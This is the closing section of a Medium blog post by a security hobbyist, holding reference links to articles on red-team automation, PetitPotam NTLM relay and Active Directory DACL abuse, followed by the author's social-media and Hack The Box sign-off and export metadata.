> 🔗 [https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/sheepl-20-automating-people-for-red-and-blue-tradecraft/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/sheepl-20-automating-people-for-red-and-blue-tradecraft/)

> 🔗 [https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory](https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory)

[https://www.thehacker.recipes/ad/movement/dacl/](https://www.thehacker.recipes/ad/movement/dacl/)

---

![](https://cdn-images-1.medium.com/max/800/0*c090SRGHymR5-d1M.png)

### Wanna Keep in Touch with Maverick?

![](https://cdn-images-1.medium.com/max/800/0*MO5ZRYBlXVCScMaC.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

By Mohamed Eletreby on March 26, 2025.

Canonical link

Exported from Medium on April 20, 2026.